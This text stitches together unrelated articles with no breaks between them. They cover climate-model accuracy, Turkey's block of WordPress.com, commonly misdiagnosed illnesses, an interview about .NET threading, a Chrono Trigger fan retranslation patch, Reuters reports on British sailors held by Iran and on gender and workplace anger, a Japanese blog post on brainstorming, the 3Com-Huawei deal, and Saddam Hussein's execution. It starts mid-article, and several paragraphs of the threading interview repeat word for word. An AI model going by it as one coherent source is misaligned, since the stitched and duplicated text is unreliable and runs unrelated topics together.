Models can also be checked against their ability to reproduce global temperature trends since the mid-1800s , when the Industrial Revolution began in earnest .
The better the models do , the more confidence modelers have in their handiwork .
Regional projections not as good
But if modelers feel confident about their virtual climates on a global scale , confidence falls as global models are drafted to provide regional projections .
And it 's these narrowly confined projections that policymakers demand .
Hendrik Tennekes , former director of the Royal Netherlands Meteorological Society , has argued that while he agrees with the IPCC that rising CO2 levels are affecting global temperatures , once models begin focusing on regional projections , they break down .
Much of that has to do with how they handle poorly understood features of the climate system such as the Arctic Oscillation , which affects rainfall patterns below the Arctic Circle .
Overinterpreting models can also be a problem , says Tom Delworth , who heads the climate dynamics and prediction group at GFDL .
" The more you know about models , " he says , " the better you realize how important it is to make sure that you 're using the model for the class of problems it was built to answer .
Sometimes people try to use models to answer questions they were n't designed to answer . "
Let us hear from you
The folks responsible for blocking WordPress.com in Turkey have issued a press release , here ’s some snippets .
As it is known by public , the entry of the publications to Turkey of the blog service named “ woldpress.com ” that gives the opportunity of opening free site to internet users is interrupted with the judgement .
This judgement is applied on 17.8.2007 and thus the entery of worldpress.com service and the publications of all sub-sites which takes service from this service to Turkey is interrupted .
a I wish they had blocked worldpress.com instead .
They seem proud that they blocked all the sites instead of just the ones that they consider illegal under Turkish law .
The reason of this suspention , is that the limitlessly enable to illegal publications of the mentioned blog service , not taking to notice about the suspention of the applications and ignoring the judgements that are given by the Turkish courts related to the suspention of known sub-sites .
The free and uncontrolled opportunities provided by the mentioned service are directed baleful people to this service and in a short time wordpress.com is returned to the voice and publication center of separatist - disastrous ideologies , private hostilities , illegal targets .
As far as I know , we never received any notice from Turkish courts about anything , only barely coherent threats and bully - attempts written much like the above .
Thus before ABOUT 17 TÄ°MES we have appealed to the mentioned site administration for the suspention of the unlawful publications , but the site administration did not take any caution about these publications .( one of our applications is published in their sites )
Thereon about our applications RELATED WITH THE SUB SITES THAT ABUSE OUR CLIENT ’S PERSONAL RIGHTS the Turkish courts have given numerous judgements for the closing of the illegal sub-sites which are broadcasting under WordPress .
These judgements are delivered to the center of the mentioned firm in USA and to the agency in Turkey , this time the suspention of the illegal publications according to the judgements of the Turkish courts is asked .
BUT , IN SPITE OF THE ALL WRITTEN AND ORAL APPLICATIONS , THE MENTIONED FIRM AND ITS AGENCIES ARE NOT AFFILIATE OUR REQUIREMENTS AND THE JUDGEMENTS OF THE TURKISH COURTS AND THEY INSISTED ON APPLYING .
Just to clarify when they said they contacted us 17 times , that means that they would blast the same email to multiple address and when they did n’t get the reply they wanted they sent the same message over and over again .
In addition to some blogs they complained about , their main request was that we block the name of their client being used by any blog hosted by our site , much like you ca n’t write “ democracy ” on blogs hosted by MSN Spaces in China .
I ’m going to skip some bits to the threat at the end :
There is a lesson which all blog services and internet service providers should take from this judgement .
Blog services , especially the ones that give free service , should be careful about the sites that are illegally active through their firms .
These services should not remain insensitive to the complints that they receive and especially to the judgements .
It is certain that the services which behave opppositely will meet with the same enforcement that WordPress met .
So if you do n’t disallow certain words being used on your blogs , you ’ll be punitively punished through our state - controlled ISP .
Today those words are “ Adnan Oktar . ”
Who knows what they ’ll be tomorrow .
Empowered Patient is a regular feature from CNN Medical News correspondent Elizabeth Cohen that helps put you in the driver 's seat when it comes to health care .
ATLANTA , Georgia --
The celebrity was John Ritter .
Actor John Ritter died in September 2003 from an aortic dissection , a commonly misdiagnosed condition .
The actor died in 2003 of an aortic dissection -- a tearing of the major artery that comes out of the heart .
His widow later settled a wrongful death lawsuit against a California hospital , alleging his condition had been misdiagnosed " at least twice . "
Experts who study malpractice cases and autopsy reports say certain diseases are misdiagnosed over and over again .
It 's worth knowing what they are so you wo n't be a victim .
1. Aortic dissection : Sometimes aortic dissections are easy to diagnose -- a patient feels a distinct tearing sensation in his or her chest .
But other times they 're pretty easy to miss because the symptoms could point to other diseases , says Dr. Robert Bonow , past president of the American Heart Association .
" Sometimes it feels like heartburn , " he says .
2. Cancer : In a Harvard study of malpractice claims in the U.S. , cancer was far and away the most misdiagnosed illness , primarily breast and colorectal .
Study authors attributed this to doctors failing to stick to cancer screening guidelines .
3. Clogged arteries : Sometimes doctors tell patients they 're short of breath because they 're out of shape , when it 's actually coronary artery disease , says Bonow , who 's also the chief of cardiology at Northwestern Medical School .
4 . Heart attack : Sound strange ?
How could a doctor miss a heart attack ?
Bonow says the big and obvious attack -- the one where someone clutches his or her chest and falls to the floor , the one Bonow calls " the Hollywood heart attack " -- is n't always so clear .
Sometimes the only signs of a heart attack are a sense of fullness in the chest , nausea and a general sense of not feeling well .
5. Infection :
In the Harvard study , infection followed cancer as the most misdiagnosed condition .
So how can you keep yourself from becoming a victim of misdiagnosis ?
1 . Ask for more tests
Actually , Nancy Keelan says , demand more tests .
For more than three years , Keelan says , she complained to her gynecologist about irregular , heavy bleeding , and for three years he told her she was entering menopause and not to worry .
Keelan says it turned out she had both advanced endometrial and ovarian cancer .
" I believe he missed my diagnosis five times , " says Keelan , who was 46 when she got her correct diagnosis .
Keelan , a registered nurse , now speaks to women 's groups , telling them not to let more than three weeks go by if they 're having new , strange symptoms .
She says if the doctor tells you it 's no big deal , you can frame your request this way :
Tell your doctor you know it might be nothing , but would it do any harm to have a simple test ?
She says a simple ultrasound , would have caught her cancer much earlier .
2 . Ask , " What else could my illness be ? "
Let 's say you 've been experiencing shortness of breath when you exercise , and your doctor tells you you 're just out of shape .
You can ask your doctor if it could possibly be something more dangerous .
Dr. Mark Graber , chief of medicine at the Veteran 's Administration in Northpoint , New York , says the single most common cause of misdiagnosis is a doctor 's failure to consider other possibilities after an initial diagnosis is reached .
" It 's called premature closing -- the minute they come up with a diagnosis , they do n't think about a better solution , " he says .
3 . Do n't assume no news is good news
Another source of misdiagnosis : Lab results get lost or forgotten .
A study by Dr. Tejal Gandhi at Harvard Medical School found that up to 33 percent of physicians did not always notify patients about abnormal test results .
" No news is not good news , " says Dr. Saul Weingart , vice president for patient safety at Dana Farber Cancer Institute .
" It might be that the report fell down behind someone 's desk . "
4 . Assume your doctors do n't talk to one another
Our experts said doctors often do n't share information about test results .
One piece of advice :
Use that conference call function on your cell phone .
Make phone appointments with your doctors at the same time , and then conference them all together .
5 . Be wary when your doctors work in shifts
The title of Gandhi's 2005 study in the Annals of Internal Medicine says it all : " Fumbled Handoffs : One Dropped Ball after Another . "
In it , she describes how a hospital patient 's tuberculosis was misdiagnosed partly because test results were n't passed on when doctors changed shifts .

All About Cancer • Heart Attacks
This is the fifth and last post in my Interviewing the Parallel Programming Idols - Series .
A lot of other potential interview partners have been suggested by some of my readers and I may get back to doing another round of this series after a while .
My interview partner today is Joe Duffy , who used to be the concurrency program manager on the Common Language Runtime team from Microsoft .
He is now back to being a developer and works on parallel libraries , infrastructure , and programming models in Microsoft ’s Developer Division .
This puts him into a unique position to talk about threading and .NET , especially since he also has a widely - know blog about the topic and has authored a book on .
NET : Professional .NET Framework 2.0 .
I am therefore very grateful that he agreed to answer my questions !
Five questions about parallel programming in general first :
Michael :
As we are entering the many - core era , do you think parallel computing is finally going to be embraced by the mainstream ?
Or is this just another phase and soon the only people interested in parallel programming will be the members of the high performance community ( once again ) ?
Joe :
It ’s difficult to predict how , where , and when parallel programming will become mainstream .
More performance provides a lot of value for many ( but not all ) people , and in fact helped to drive PC sales ( and indirectly , commercial software sales ) during the glory days .
So , sure , parallelism will absolutely be mainstream .
But note that “ mainstream ” may not mean that every programmer needs to think about fine - grained parallelism when s/he writes application code .

So , sure , parallelism will absolutely be mainstream .
But note that “ mainstream ” may not mean that every programmer needs to think about fine - grained parallelism when s/he writes application code .
In some sense , however , most software developers would n’t be comfortable “ embracing ” parallelism : it is quite difficult to program parallel computers today ( with the technologies most PC developers use , at least ) , and most people do n’t even know what to do with the amount of processing power that the many - core era is bringing to everyday desktop machines anyway .
A smaller number of early adopters will learn how to exploit mainstream parallel computers to add customer value , make a lot of money , show the rest of us what great things can be done , and then we will likely see a breakthrough .
Abstracting as much of it away as possible will be key .
We ’re not quite at that point yet .
Michael : From time to time a heated discussion evolves on the net regarding the issue of whether shared - memory programming or message passing is the superior way to do parallel programming .
What is your opinion on this ?
Joe : Shared - memory vs. message - passing is a red herring .
What is the difference between sending and receiving a message ( as in message - passing systems ) and forking and joining on a data parallel computation ( as in a shared - memory system ) ?
Logically they are in fact quite similar , aside from the specific logistics of data management , communication , and access .
In terms of parallelism , however , you still have to worry about dependencies , causality , composability , fault tolerance , and so on .
Shared memory does n’t magically do away with these very important ( and difficult ) issues .

In terms of parallelism , however , you still have to worry about dependencies , causality , composability , fault tolerance , and so on .
Shared memory does n’t magically do away with these very important ( and difficult ) issues .
The important question to me is : how do we unify the two worlds ?
How do we incorporate the atomicity and isolation properties that messaging often gives you in a first class way into the programming constructs that most developers use ?
( Or , alternatively , what programming languages should people use for parallel programming if we can’t change the ones they are already using ? )
Message passing systems are special in the sense that they are often built with these ideas in mind .
I fully believe that immutability and isolation are two things that all modern type systems should support ( and encourage use of ! ) in a 1st class way , even for imperative , shared memory , C - style languages .
Few of them do ( yet ) .
Michael : From your point of view , what are the most exciting developments / innovations regarding parallel programming going on presently or during the last few years ?
Joe :
There ’s been a steady explosion of work on program verification techniques , new synchronization mechanisms ( like transactional memory ) , and new ways of expressing fine - grained parallelism ( like data parallelism ) .
The Fortress , X10 , and Chapel work aside from transactional memory support is also quite interesting .
The Haskell community is doing a lot of neat stuff with data parallelism , and NESL - like nesting , so keep an eye out there too .
These are all very exciting to me .
Michael :
Where do you see the future of parallel programming ?
Are there any “ silver bullets ” on the horizon ?
Joe : I do n’t believe there will be any parallel programming silver bullets .
Hardware parallelism is a great example of how we can combine various ILP techniques ( wide issue superscalars , branch prediction , pipelining , etc. ) to give a respectable parallel speedup , but the magic is in the combination of these things .
The story will be similar for software I think .
We ’ll have a high - level structure to the programs that permits large independent chunks to run in parallel ( probably isolated ) , moderate - level structure to permit logically independent activities to run in parallel , and very fine - grained parallelism ( data - and task - driven ) to make the actual statements that comprise the activities run in parallel .
These will all come from different abstractions : from libraries to language extensions to runtime smarts .
Michael :
One of the most pressing issues presently appears to be that parallel programming is still harder and less productive than its sequential counterpart .
Is there any way to change this in your opinion ?
Joe :
It will always be harder for some select programmers ( i.e. the ones providing the new , useful capabilities ) , but I believe we ’ll make a lot of progress toward making it less hard for most programmers through abstraction .
There are simply more design and implementation issues to worry about when parallelism enters the picture , and program state machines become dramatically more complex .
Programmers actually need to understand the dependencies in their code , and to architect with a looser coupling and with less sharing .
Things will get better with time .
So much for the first part of this interview .
Without further ado , here is the second part about .NET threads :
Michael :
What are the specific strengths and weaknesses of .NET threads as compared to other parallel programming systems ?
Where would you like it to improve ?
Joe :
The main strength of .NET threading is that there are many useful basic building blocks available from which to create other abstractions .
The main weakness is that many of the useful abstractions you ’d like to have are n’t available “ out of the box ” .
Michael :
If you could start again from scratch in designing .NET threads , what would you do differently ?
Joe :
It ’s hard to say we could have done it differently , but there are a lot of hard issues in the current .
NET Framework and Win32 APIs which inhibit parallelism .
We ’ve grown up in a shared memory , mutable world , and there are a lot of subtle dangers that have arisen as a result .
A select few people deeply understand these dangers , and can teach others ( or build abstractions that hide them ) , but I believe we ’d have been better off if parallelism were a 1st class concern from day one .
The reality of our single - CPU - minded world for the past 20 + years simply made this end result infeasible to anticipate .
Michael :
Are there any specific tools you would like to recommend to people who want to program in .NET threads ?
IDEs ?
Editors ?
Debuggers ?
Profilers ?
Correctness Tools ?
Any others ?
Joe : Visual Studio is pretty good at allowing you to step through concurrent programs , and WinDbg exposes plenty of useful raw data ( like OS threading data structures ) .
The performance profiler that comes with Visual Studio 2005 is also useful at analyzing where the cycles went and also at various hardware performance counters , like L2 cache misses .
Intel ’s VTune and related threading tools are also quite useful at analyzing tricky thread interactions , though there are limitations when working with .
NET .
Michael : Please share a little advice on how to get started for programmers new to .NET threads !
How would you start ?
Any books ?
Tutorials ?
Resources on the internet ?
And where is the best place to ask questions about it ?
Michael :
What is the worst mistake you have ever encountered in a .NET threads program ?
Joe : .NET threading is a very low - level and raw way to program .
People have difficulties with races and deadlocks and other reliability related things , unexpected reentrancy , GUIs , thread affinity , and many other problematic things .
I wrote an article on my blog reviewing many of the .NET threading is a very low - level and raw way to program .
People have difficulties with races and deadlocks and other reliability related things , unexpected reentrancy , GUIs , thread affinity , and many other problematic things .
I wrote an article on my blog reviewing many of the most common mistakes library programmers make , which may be interesting and relevant .
Michael :
Thank you very much for your answers !
Retranslation
General Information [ edit ]
Welcome to the Chrono Trigger Retranslation Project , completed in script form on March 30 , 2007 .
Thanks to fan translator KWhazit , the dream of a full original translation is now reality .
All dialogue in the game , as well as all lists of items , weapons , armor , locations , etc. have been rendered in English once more .
A clearer portrayal of Chrono Trigger as intended by its Japanese creators is now available .
It is not the opinion of this project that Ted Woolsey 's official translation was bad or insufficient in any way -- only that some essence of the game was lost or altered , given Nintendo of America 's censorship standards and the inability of the game to hold all the original text when translated to English .
Here 's a sample of the final product :
The retranslation is presented in HTML , Excel , and text files .
The scripts present Woolsey 's original translation , the Japanese script , and KWhazit 's retranslation ( with annotations ) in a four - column format which allows easy cross referencing of sources .
For those seeking specific and important differences between the original North American release and the original , a special article has been made with excerpts of the scripts .
A full name guide is also up for download with the spreadsheets .
Patch [ edit ]
To play the Retranslation , download the .ips patch and follow the installation instructions in the readme text file included .
To download three patches allowing the patch 's hard changes to be applied to your own work :
If you would like to remove the title screen so that you can use the retranslated Chrono Trigger as a template for your own ROM hacking work , apply this anti-patch :
To learn about the making of the patch , hit this feature :
This patch does not feature :
Variable - width font ( slows down performance )
This patch does not enable this Japanese feature :
Equipment screen item count ( would interfere with names )
This patch does enable these features :
Ayla 's Cro nickname ( via second naming screen with Ayla ; choose the nickname )
Marle 's formal name ( simply adding " dia " to the end of { Marle} strings )
Special Japanese ending art for Crono & Marle 's balloon parade ending
Sky / Dark element icons replacing Lightning / Shadow images
Certain item and location names were shortened .
To view the full names , consult the script release .
There are no easter eggs ; do n't bother searching .
Thanks go to KWhazit ( translation ) , ZeaLitY ( script insertion and miscellaneous ) , Geiger and JLukas ( technical assistance and hard hacking ) , Vehek ( title screen creation ) , and Lena Andreia ( elemental icon and banner creation ) .
Lastly , Kyronea contributed a few location insertions as well .
Script Presentations [ edit ]
Choose your method of viewing below .
The Dialogue Packet Edition presents strings in the order they are stored in the game .
The Game Order Edition presents them as the player would naturally encounter dialogue .
For the HTML files , give them a few seconds to load , as the multitude of tables from spreadsheet conversion make them especially demanding on browsers .
Why Retranslate ? [ edit ]
A few factors contributed to our desire to have Chrono Trigger retranslated .
Specifically , Ted Woolsey did remark in an interview ( see here ) that a lot of text was cut out because the strings became too long after translation .
Additionally , Woolsey did make mistakes in places .
For instance , take the line :
Gaspar :
One of you is close to someone who needs help .
Find this person , fast .
It was supposed to read something to the effect of , " For matters concerning each time era , talk to your teammates . "
It 's a hint telling you to talk to the various player characters standing around the End of Time ; upon doing so , they will provide information about the sidequests in their home eras .
The original meaning was heavily distorted , and led to endless discussion in the community befor e a proper translation was given .
Also , there 's a line in Zeal that states , " Janus , Schala 's step - brother , does n't have a speck of magic . "
Hey , he 's not a step - brother !
Little mistakes like these can cloud comprehension and understanding of the game 's finer plot details and characterization .
Just to clarify , we are n't saying Ted Woolsey sucks .
Censorship standards were imposed by Nintendo , and translators often have a hard time fitting every last bit of meaning into sentences without running over .
For a clarification of Ted Woolsey 's experiences , see this page .
For the whiners :
We apologize for not translating your favorite Japan - only game , Densetsu no Haineko LXI .
In the future , KWhazit will be more mindful of your nerdy complaints and choose an obscure game to satisfy your refined tastes in RPGs .
Also , we will no longer present our work as a " hobby " by fans and for fans , but instead we will present ourselves as crusaders against Nintendo 's sacrilegious inaccuracy and censorship .
In line with this paradigm shift , KWhazit will begin demanding monthly Paypal contributions to continue , and will make irregular posts complaining about real life .
To make a splash , we will announce no less than 10 new fan translations at at time , with release dates ( if you 're lucky ) of no less than ten years out .
Only then will we be a true fan translation unit and cater to your expectations and tastes .

LONDON ( Reuters ) - Iranian television on Wednesday displayed some of 15 British sailors and marines detained at sea last week and showed the only woman crew member saying they had “ trespassed ” into Iranian waters .
Britain , which earlier broke all official contacts with Iran except those related to the detained crew , said it feared they may have been coerced into appearing on television .
It insists they were seized in Iraqi waters .
“ It is completely unacceptable to parade our people in this way , ” British Defense Minister Des Browne said .
After the broadcast , Iran ’s foreign minister told Reuters London must accept the sailors were arrested in Iranian territory , while repeating an earlier announcement the woman would be freed “ as soon as possible ” .
London said it had no confirmation of any imminent release and demanded access to the group , detained at a time of high tension between Iran and Western countries over Tehran ’s nuclear program .
Al - Alam , a state - run Arabic - language television channel , showed the woman , Faye Turney , and several of the other sailors in uniform eating off plastic plates in a well - lit room .
It also showed a separate interview with Turney , who British media said was married with a three - year - old daughter , wearing a black headscarf , smoking a cigarette and speaking about her detention and treatment .
“ I was arrested on Friday the 23rd of March .
Obviously we trespassed into their waters , ” Turney said in an even voice .
A letter from Turney to her parents , released by Iran , said she had written “ to the Iranian people to apologize ” .
Britain ’s Defense Ministry said global positioning data showed the British sailors and marines were 1.7 nautical miles within Iraqi waters when they were captured by Iranian gunboats near the waterway that separates Iran and Iraq .
“ The boats remained throughout well within Iraqi territorial waters , ” Britain ’s Deputy Chief of Defense Staff , Vice Admiral Charles Style , told a news conference .
“ ROUTINE OPERATION ”
Iran ’s Foreign Minister Manouchehr Mottaki disagreed .
“ The real picture is that the British sailors were arrested in the territorial waters of Iran ... this must be accepted by the government of the UK , ” Mottaki told Reuters in Riyadh .

British Foreign Secretary Margaret Beckett earlier told parliament Britain would freeze all official bilateral business with Iran apart from efforts to resolve the crisis .
“ I am very concerned about these pictures and any indication of pressure on or coercion of our personnel who were carrying out a routine operation in accordance with international law , ” Beckett said in a statement after the broadcast .
With the United States conducting naval exercises in the Gulf , the rising tension rattled global markets .
Oil prices rose more than $ 1 a barrel on Wednesday to settle at around $ 64 after an overnight spike by as much as $ 5 .
Gold jumped to a four - week high on safe - haven buying before prices eased .

The price rises were fueled by rumors , quickly denied , of a clash between Iran and U.S. military forces .
“ Although it did n’t happen this time , people think it could happen , ” said Christopher Bellew , a broker at Bache Financial .
For the first time since the U.S. invasion of Iraq in 2003 , a second U.S. aircraft carrier , the John C. Stennis , arrived in the Gulf for previously scheduled naval war games .
Both the United States and Iran played down the U.S. naval exercises .
Washington insisted they did not escalate tensions and a headline on Iranian state television screens read : “ Iran : ‘ no concern about Pentagon ’s war games in the Persian Gulf ’ . ”
A U.N. Security Council resolution passed at the weekend tightened sanctions against Iran over its nuclear program .
The Security Council wants Iran to stop enriching uranium , which could be used for weapons or power plants .
Iran says its nuclear program is solely for peaceful purposes and calls the sanctions illegal .
British Prime Minister Tony Blair said the detention of the sailors was “ wrong and illegal ” .
The European Union backed Britain .
Angela Merkel , chancellor of the bloc ’s president Germany , said the EU extended its “ absolute support and solidarity ” .
UnderSecretary of State Nicholas Burns called Iran ’s behavior “ reprehensible ” .
“ We and all the other allies and many other countries that are n’t even allied to Britain around the world think this is odious behavior on the part of the Iranian authorities , ” he told BBC television .
Iran ’s embassy in London said the British sailors and marines were 0.5 km inside Iranian waters at the time .
Britain says its 15 personnel had searched a merchant ship in Iraqi waters , with a U.N. mandate , when they were captured .
In a similar incident , Iran freed eight British service members after holding them for three days in 2004 , a time of less tension with the West .
In 1979 , Iranian students seized the U.S. embassy in Tehran and captured 90 hostages ; 52 were held captive for 444 days .
NEW YORK ( Reuters ) - A man who gets angry at work may well be admired for it but a woman who shows anger in the workplace is liable to be seen as “ out of control ” and incompetent , according to a new study presented on Friday .

What ’s more , the finding may have implications for Hillary Clinton as she attempts to become the first female U.S. president , according to its author Victoria Brescoll , a post - doctoral scholar at Yale University .
Her research paper “ When Can Angry Women Get Ahead ? ” noted that Clinton was described last year by a leading Republican as “ too angry to be elected president . ”
Previous research has indicated that anger can communicate that an individual feels entitled to dominate others , and therefore perhaps is .
But in a paper to be delivered at a weekend conference , Brescoll said such studies focused on men .
“ As Senator Clinton ’s experience suggests , however , for a professional woman anger expression may lead to a decrease rather than an increase in her status , ” Brescoll wrote .
She conducted three tests in which men and women recruited randomly watched videos of a job interview and were asked to rate the applicant ’s status and assign them a salary .
In the first , the scripts were identical except where the candidate described feeling either angry or sad about losing an account due to a colleague ’s late arrival at a meeting .
Participants conferred the most status on the man who said he was angry , the second most on the woman who said she was sad , slightly less on the man who said he was sad , and least of all by a sizable margin on the woman who said she was angry .
SALARY GAP
The average salary assigned to the angry man was almost $ 38,000 compared to about $ 23,500 for the angry woman and in the region of $ 30,000 for the other two candidates .
In a second experiment , the script was similar except that the job applicant also described his or her current occupation as a trainee or a senior executive .
“ Participants rated the angry female CEO as significantly less competent than all of the other targets , including even the angry female trainee , ” Brescoll wrote .
She said they viewed angry females as significantly more “ out of control . ”
That impacted salaries .
Unemotional women were assigned on average $ 55,384 compared to $ 32,902 for the angry ones .
Male executive candidates were assigned more than trainees , regardless of anger , with an average $ 73,643 .
A third experiment tested whether a good reason for anger made any difference .
The script was changed so that some angry candidates explained that the co-worker who arrived late had lied beforehand , indicating he had directions to the meeting .
Sure enough , the angry woman with a good reason to be angry was awarded a much higher salary than the angry woman who provided no excuse , though it was still less than the men .
The study , to be presented this weekend at the annual meeting of the Academy of Management , a research and teaching organization with nearly 17,000 members , found similar attitudes to anger among male and female participants .
“ It ’s an attitude that is not conscious , ” Brescoll said .
“ People are hardly aware of it . ”
Brescoll said the findings revealed a “ difficult paradox ” for professional women -- while anger can serve as a powerful tool to achieve status at work , women may have to behave calmly in order to be seen as rational .
ブレインストーミングは死んだ！ ブレインストーミング万歳！
LifeDev 経由で読んだのですが、 「 チームによるブレインストーミングはそれほど効率的な発想法ではない」という研究結果について紹介する記事がありました。
心理学者の研究によると、何人かの人を集めてブレインストーミングのセッションをしたのと、個々の人に一人で発想をさせてあとで持ち寄るのとで、有意な差は見られなかったという研究結果です。
「 ええ？ そんな！ じゃあ今までブレインストーミングをやっていたのは無意味だったの？」と思われるかもしれませんが、答えは yes でもあり 、no でもあると思います 。
ブレインストーミングを殺す要素
非効率的なブレインストーミングならやらないほうがましという意味ではみんな意見が一致すると思います。英語版
Wikipedia の Brainstorming の項が非常に詳しいのですが、ここに書いてあることをまとめると、ブレインストーミング効率を下げてしまう要因には次のようなものがあるようです。
問題設定が絞り切れていない： よく 「 ブレストしよう！」と言い出す人に限って、いくら言い合ったところで解決できない問題を議題に挙げることがありました。これはブレインストーミングをしているのではなくて、現状への不満をどれくらい別の言い方で言えるか試しているに等しいことがあります。まず議題を明確にしておかないと失敗は保証済みです。
問題に対する背景の共通認識を作らないままセッションを開始している：
まず最初に、バックグラウンドの説明がないと、せっかく提出したアイディアが別の人に「いや、それにはこういう話があってダメなんだよ」という具合に否定され、ブレインストーミングが一進一退になってしまいます。
その問題を議論するのに必要な人材が欠けている、あるいは多すぎる：
よくある話だと、企画を作る人と実装する人とが同じテーブルについていないので、片方だけでブレインストーミングをしても何の成果も上げられなかったという場合があります。また、アイディアが豊かで議論に参加してくれる限られた人を選んでブレインストーミングをするとことも必要なのですが、人材不足や組織の壁でなかなかできませんね。
自由に意見が言える環境が整っていない：
これが致命的です。意見が批判されたり、揶揄されたり、上下関係で押しつぶされないようにする工夫がとられていない場合が多すぎます。ブレインストーミングをしているときはアイディアへの評価は後回しだということを忘れてしまうことがなんと多いことか（自分を含め）。
セッションのまとめ役の経験不足： 意見の交通整理をしたり、理解しにくいアイディアをかみくだいて全員に提示したり、時間管理や、問題から議論の流れが外れたときの対応など、D&D のダンジョンマスターのような経験をもっている公平なまとめ役がいない。
ミニ・ブレインストーミングの裏技
心理学の原論文の方を読んでいないのでここから先は無責任に書きますが、私はやはり異なる専門分野をもった少数の人でのブレインストーミングは有効だと思っています。心理学の論文は制御された状況下で実験をしているでしょうから、こうしたシナジー効果についてはなかなか研究が進んでいないのではないでしょうか？（間違っていたらすみません）
自分の研究分野では、似たような知識と経験をもっているけれども違うことをしている人同士で行う議論がもっとも効果が高いといつも意識しています。知識と経験が似ているので、無理難題を言われることは少ないのですが、それでいて自分とは違っている意見には使えるものが非常に多いのです。
こうした人と２，３人で白紙の紙を前にして白熱したアイディアの応酬を繰り広げると、相手の考え方が触媒になって自分のアイディアが広がり、思ってもみなかった解決方法が発見できたりします。
でも、 「さあ、ブレストするぞ！」と言って人を呼び集めることはなかなかできませんので、よく使う手が昼食のときに一番議論して楽しそうな人だけを誘い、食べている最中にさりげなくブレストを始めてしまう手法です。
食べているときは偉い人でも割合ガードが下がるものですし、時間制限も食べ終わるまでと決まっています。あとはこちらの話術で「じつは気になっていることがあって…」とカードに書かれた問題点をテーブルに出して、その場の勢いで出てくる意見を暗記するか書き留めてしまいます。
もちろん、意見を集めるばかりで意見を提供しない人間と思われないように、相手が話題にするアジェンダに真摯に考えることも必要です。ふだんから、こうしたミニ・ブレインストーミングを誰彼ともなくふっかけています。毎回成功するわけではありませんが、興がのってくると紙ナプキンの両面にアイディアがびっしり、ということもたまにあります。
こうして考えると、ブレインストーミングの効果は、それを始める前に培われた少数のチームとの連帯感の中から生まれてくるものが多いわけで、手法そのものに魔法があるわけではないのかもしれませんね。ということは、やはりブレインストーミングは死んでいるのか…。いやいや…。

Several Republican members of Congress yesterday called for a Treasury Department probe into whether Pentagon computer networks will be compromised by the merger of a U.S. network - equipment maker and a Chinese firm with links to Beijing ’s military .
Senior Pentagon officials , meanwhile , are investigating the security aspects of the announced plan for China ’s Huawei Technologies and the investment firm Bain Capital Partners to buy 3Com , which makes equipment used by the Pentagon to block computer hackers , including those from the Chinese military .
Bain Capital announced last night that it will submit the $ 2.2 billion deal for review before Treasury ’s Committee on Foreign Investment in the United States ( CFIUS ) .
“ The agreement to acquire 3Com Corp. will be submitted voluntarily for CFIUS review , ” the statement said .
“ We believe the U.S. government review in this matter will conclude that the company will be firmly controlled by an American firm , have only a small minority foreign shareholder , and that the deal presents no risks to national security . ”
Republican Reps. Peter Hoekstra of Michigan and Duncan Hunter of California wrote to Treasury Secretary Henry M. Paulson Jr. formally requesting that CFIUS conduct a security review of the deal , which was announced by 3Com last week .
Both lawmakers , the ranking members of the intelligence and armed services committees , respectively , expressed “ alarm ” at the proposed merger because of Huawei ’s “ close ties to the Chinese government . ”
“ There is little doubt that this proposed arrangement should be reviewed by CFIUS , and we formally request that you initiate a review regardless of whether or not Bain Capital Partners submits the deal for examination , ” they stated .
“ This review should be conducted , and a determination made , as to whether this sale will in any way impact the national security of the United States or increase the vulnerability of U.S. computer networks and telecommunications systems to Chinese intrusion . ”
Also yesterday , Sen. Christopher S. Bond of Missouri , the ranking Republican on the Senate Select Committee on Intelligence , said yesterday that Treasury should review the 3Com - Huawei deal .
“ It is troubling to me that a foreign military organization with interests in communications might obtain access to our security systems , ” Mr. Bond said .
A Treasury secretary spokeswoman declined to comment .
In their letter , the two House members said Huawei ’s role as a partner appears designed to “ circumvent legal issues about whether this deal should be reviewed by ” CFIUS .
“ At stake is whether Huawei will control voting seats on the board of the new company , and far more importantly , will it have access to the technology and research and development of the new company , ” they said .
Both committees ’ staff have been ordered to review 3 Com ’s contracts with intelligence agencies and the Pentagon , they stated .
“ This sale raises the ongoing and thorny issues of illegal technology transfers to China , public reports of Chinese cyberattacks on U.S. government networks , repeated efforts by the Chinese government to gain access to military sensitive and classified technologies of the U.S. government , and continuing concerns about infringement of intellectual property rights by Chinese companies , ” Mr. Hoekstra and Mr. Hunter stated .
Huawei is a state - run telecommunications firm that in the past sold equipment , in violation of United Nations sanctions , that was used by Saddam Hussein ’s military .
The company also provided equipment to the Afghan Taliban when it was harboring al Qaeda terrorists .
Chinese military computer hackers were detected breaking into Pentagon computer systems several months ago , and there are concerns the 3Com merger would boost Beijing ’s hacking capabilities .
“ There is no doubt as to why the Chinese want a partnership with 3Com , ” Mr. Hoekstra said in an interview .
“ They look at this as a key connection to stealing additional secrets from U.S. corporations and from our national security apparatus . ”
Additionally , Mr. Hoekstra said the merger could help China obtain high - technology hardware to assist the Chinese military in its aggressive efforts to penetrate U.S. government computers and networks .
If the proposed merger goes through , the Chinese will be able to learn details of “ things we put in place to block hackers , so they will be in a better position to defeat those defenses , ” Mr. Hoekstra said .
A defense official said senior policy - makers were caught by surprise by the Huawei deal , in a manner similar to the Pentagon ’s failure to respond quickly to the proposal last year by United Arab Emirates company Dubai Ports World to manage six major U.S. seaports .
That deal was canceled over national security concerns .
Sen . Jeff Sessions , Alabama Republican , said the 3Com - Huawei deal raises more red flags than the Dubai Ports World deal and called on the Bush administration to provide information about the 3Com deal to congressional leaders and request action from Congress if needed .
“ If there is a loophole that is allowing valuable defense technology to be obtained by the Chinese military that will enable them to accelerate their military expansion , then we ought to close it , ” said Mr. Sessions , a member of the Senate Armed Services Committee .
Other Republican lawmakers calling yesterday for hearings or investigations included Reps .
Thaddeus McCotter of Michigan , chairman of the House Republican Policy Committee , and Dana Rohrabacher of California , a Foreign Affairs Committee member .
Government officials concerned about the deal have doubts about a Treasury review , because Mr. Paulson is a former executive at Goldman Sachs , which is advising 3 Com on the deal .
White House Chief of Staff Joshua B. Bolten also was a Goldman Sachs executive .
S.A. Miller contributed to this report .

Saddam Hussein was president of Iraq from 1979 until 2003
It would show him standing on the gallows with a Libyan resistance leader who fought Italian occupation , executed in 1931 , Libya 's Jana news agency said .
Libya declared three days of mourning after Saddam Hussein 's death and cancelled public celebrations around the Eid religious holiday .
He was sentenced to death after being convicted of crimes against humanity .
An Iraqi court handed down the sentence in November after a year - long trial over the killings of 148 Shias from the town of Dujail in the 1980s .
Iraq 's prime minister hailed the execution , but it also sparked protests among Sunni communities in the country .
Correspondents say the news was met with a mixture of surprise and anger in some parts of the Arab world .
